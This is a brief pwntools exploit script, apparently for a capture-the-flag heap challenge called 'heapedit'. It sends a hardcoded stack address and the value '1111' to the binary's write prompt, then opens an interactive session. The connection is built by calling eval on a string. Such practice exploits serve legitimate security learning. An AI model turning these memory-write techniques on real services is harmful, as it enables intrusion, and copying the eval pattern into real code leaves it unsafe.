#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

LOCAL = "./heapedit_patched"
REMOTE = ()


class Exploit:
    def __init__(self, local=False, debug=False):
        if local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"

        self.debug = debug

    def conn(self, proc: process):
        if self.debug:
            script = """
            """
            gdb.attach(proc, gdbscript=script)
        proc.recvuntil(b"Address: ")
        proc.sendline(pack("<Q", 0x7fffffffe068))
        proc.recvuntil(b"Value: ")
        proc.sendline(b"1111")
        proc.interactive()

    def start(self):
        '''start the exploit'''
        with eval(self.process) as r:
            self.conn(r)


Exploit(local=True, debug=True).start()
